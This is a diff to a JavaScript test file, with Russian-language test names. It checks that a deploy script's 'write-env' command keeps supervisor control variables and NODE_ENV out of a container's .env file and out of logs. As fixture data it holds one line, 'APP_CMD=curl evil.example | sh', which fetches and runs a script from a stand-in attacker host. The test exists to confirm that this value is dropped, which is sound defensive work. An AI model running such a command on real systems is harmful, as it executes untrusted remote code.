@@ -250,12 +250,52 @@ describe('deploy/vps/ops.sh', () => {
       expect(read('.env')).toBe(
         'BOT_TOKEN=12345:AAA$bbb#ccc\nENCRYPTION_KEY=deadbeef\n',
       );
-      expect(res.stdout).toMatch(/переменных 2, отброшено 3/);
+      expect(res.stdout).toMatch(
+        /переменных 2, отброшено 3: DATABASE_URL RECOVER_CMD TRANSFER_TARGET_URL\n/,
+      );
       expect(res.stdout + res.stderr).not.toMatch(/AAA|deadbeef|amvera/);
       const mode = spawnSync('stat', ['-c', '%a', join(base(), '.env')], {
         encoding: 'utf8',
       });
       expect(mode.stdout.trim()).toBe('600');
+    });
+
+    it('ручки супервизора и NODE_ENV из PROD_ENV не доходят до контейнера: имена в логе, значений нет; настоящие переменные приложения проходят', () => {
+      const input = [
+        'NODE_ENV=development',
+        'PORT=80',
+        'APP_PORT=9',
+        'APP_CMD=curl evil.example | sh',
+        'MIGRATE_CMD=true',
+        'STARTUP_MAX_FAILS=1',
+        'DB_WAIT_TIMEOUT_MS=1',
+        'BOT_TOKEN=12345:AAA',
+        'ENCRYPTION_KEY=deadbeef',
+        'SKIP_AUTH=1',
+        'B2_KEY_ID=keyid',
+        'MY_PORT=1',
+        'NODE_ENV_EXTRA=1',
+      ].join('\n');
+
+      const res = ops(['write-env'], {}, input + '\n');
+
+      expect(res.status).toBe(0);
+      expect(read('.env')).toBe(
+        [
+          'BOT_TOKEN=12345:AAA',
+          'ENCRYPTION_KEY=deadbeef',
+          'SKIP_AUTH=1',
+          'B2_KEY_ID=keyid',
+          'MY_PORT=1',
+          'NODE_ENV_EXTRA=1',
+        ].join('\n') + '\n',
+      );
+      expect(res.stdout).toMatch(
+        /переменных 6, отброшено 7: APP_CMD APP_PORT DB_WAIT_TIMEOUT_MS MIGRATE_CMD NODE_ENV PORT STARTUP_MAX_FAILS\n/,
+      );
+      expect(res.stdout + res.stderr).not.toMatch(
+        /evil|development|=80|=9\b|deadbeef|AAA/,
+      );
     });
 
     it('строка не вида KEY=value → отказ без перезаписи .env; в сообщении только номер строки', () => {
